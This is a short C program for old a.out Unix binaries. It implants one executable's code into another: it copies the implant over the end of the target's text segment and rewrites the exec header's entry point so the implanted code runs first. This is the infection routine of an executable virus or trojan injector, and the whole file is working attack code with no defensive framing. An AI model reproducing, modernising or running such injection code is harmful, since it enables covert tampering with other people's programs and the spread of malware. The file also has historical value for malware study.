#include <stdio.h>
#include <stdlib.h>
#include <a.out.h>


main(ac, av)
	int             ac;
	char          **av;
{
	struct exec     exhdr;
	FILE           *fp;
	FILE			*fp_inf;
	int inf_size, new_entry, zero_count, instr_count;
	unsigned int instr;
	char *buf;

	/* argument check */
	if (ac < 3) {
		exit(1);
	}
	/* open file to implant in */
	if ((fp = fopen(*(av + 2), "r+")) == NULL) {
		(void) fprintf(stderr, "%s: couldn't open %s for reading and writing\n",
			*av, *(av + 2));
		exit(1);
	}
	/* open file to implant */
	if ((fp_inf = fopen(*(av + 1), "r")) == NULL) {
		(void) fprintf(stderr, "%s: couldn't open %s for reading\n",
			*av, *(av + 1));
		exit(1);
	}
	/* read exec header of file to implant in */
	if ((fread((char *) &exhdr, sizeof(struct exec), 1, fp)) == NULL) {
		(void) fprintf(stderr, "%s: couldn't read %s file header\n", 
			*av, *(av + 1));
		exit(1);
	}

	/* find size of file to implant */
	fseek(fp_inf, 0x20, 0); /* skip past exec header */
	for (instr_count = 0, zero_count = 0; zero_count < 2; ++instr_count) {
		fread((char *)&instr, 1, 4, fp_inf);
		if (instr == 0 && zero_count == 1)
			break;
		if (instr != 0 && zero_count == 1)
			zero_count = 0;
		if (instr == 0 && !zero_count) {
			printf("found an UNIMP at 0x%x\n", 0x2020 + 4*instr_count);
			++zero_count;
		}
	}

	inf_size = 4 * instr_count + 32;
	new_entry = N_TXTADDR(exhdr) + exhdr.a_text - inf_size;
	printf("inf_size = %d, new entry point at 0x%x\n", inf_size, new_entry);

	/* seek to _file_offset_ in text segment to implant */
	fseek(fp, N_TXTOFF(exhdr) + exhdr.a_text - inf_size, 0);
	fseek(fp_inf, 0x20, 0); /* old exec header of file to implant */

	/* do implant */
	buf = malloc(inf_size);
	fread(buf, 1, inf_size, fp_inf);
	fwrite(buf, 1, inf_size, fp);

	/* change exec header of implanted file */
	exhdr.a_entry = new_entry;  /* address of implant */
	fseek(fp, 0, 0);
	fwrite((char *)&exhdr, sizeof(struct exec), 1, fp);

	/* close FILE pointers to be anal */
	fclose(fp);
	fclose(fp_inf);
}
